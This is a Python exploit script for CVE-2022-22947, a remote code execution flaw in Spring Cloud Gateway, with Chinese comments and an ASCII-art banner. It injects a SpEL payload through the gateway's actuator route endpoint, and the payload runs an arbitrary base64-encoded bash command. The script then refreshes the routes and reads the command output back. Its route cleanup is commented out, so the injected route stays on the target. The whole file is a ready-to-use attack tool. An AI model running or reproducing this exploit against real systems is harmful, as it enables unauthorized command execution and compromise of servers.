'''
Author: twsec
Date: 2022-12-14 16:24:41
LastEditors: twsec
LastEditTime: 2022-12-15 18:12:46
Description: Spring Cloud Gateway远程代码执行漏洞-EXP
'''
import base64
import requests
import getopt
import sys

def usage():
    #生成一个图案
    print(''' 

  __                                    
_/  |_ __  _  __  ______  ____    ____  
\   __\\ \/ \/ / /  ___/_/ __ \ _/ ___\ 
 |  |   \     /  \___ \ \  ___/ \  \___ 
 |__|    \/\_/  /____  > \___  > \___  >
                     \/      \/      \/ 

python3 CVE-2022-22947-POC.py -u url -c cmd
-u url: 目标地址
-c cmd: 执行命令
-h help: 帮助
想念你的时候，我会用你的名字喊醒自己。
''')






    

def cjly(target, cmd):
    
    
    url1 = "actuator/gateway/routes/twsec"
    url = target + url1
    #print(url)

    headers = { "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Connection": "close", "Content-Type": "application/json"}

    data = {
    "id": "twsec",
    "filters": [{
        "name": "AddResponseHeader",
        "args": {
            "name": "Result",
            "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"bash -c {echo,"+cmd+"}|{base64,-d}|{bash,-i}\").getInputStream()))}"
        }
    }],
    "uri": "http://aaaa.aa",
    "order": 0
}


    try:
        response = requests.post(url, headers=headers, json=data)
        #print(response.status_code)
        if response.status_code == 201:
            print("创建路由成功")

        else:
            print("创建路由失败")
    except:
        print("创建路由失败")

def queren(target):
    url1 = "actuator/gateway/refresh"
    url = target + url1
    headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Connection": "close", "Content-Type": "application/json"}
    data = "Upgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0"
    try:
        response = requests.post(url, headers, data)
        if response.status_code == 200:
            print("刷新路由成功")
            
        else:
            print("刷新路由失败")
    except:
        print("刷新路由失败")

def cxly(target):
    url1 = "actuator/gateway/routes/twsec"
    url = target + url1
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", "Connection": "close"}
    try:
        response = requests.get(url, headers)
        if response.status_code == 200:
            #将响应体转换为json格式，并输出filters



            response = response.json()
            print(response['filters'])
            if response['filters'] :
                print("命令执行成功！")       

        else:
            print("查询路由失败")
    except:
        print("查询路由失败")


#main函数

if __name__ == '__main__':
    usage()
    try:
        #获取命令行参数
        opts, args = getopt.getopt(sys.argv[1:], "ht:c:")
    except getopt.GetoptError:
        print('CVE-2022-22947.py -t <target> -c <cmd>')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('CVE-2022-22947.py -t <target> -c <cmd>')
            sys.exit()

        elif opt in ("-t", "--target"):
            target = arg
            #print(target)
        elif opt in ("-c", "--cmd"):
            cmd = arg
            cmd=base64.b64encode(cmd.encode()).decode()
            cjly(target, cmd)
            queren(target)
            cxly(target)
            #scly(target)

            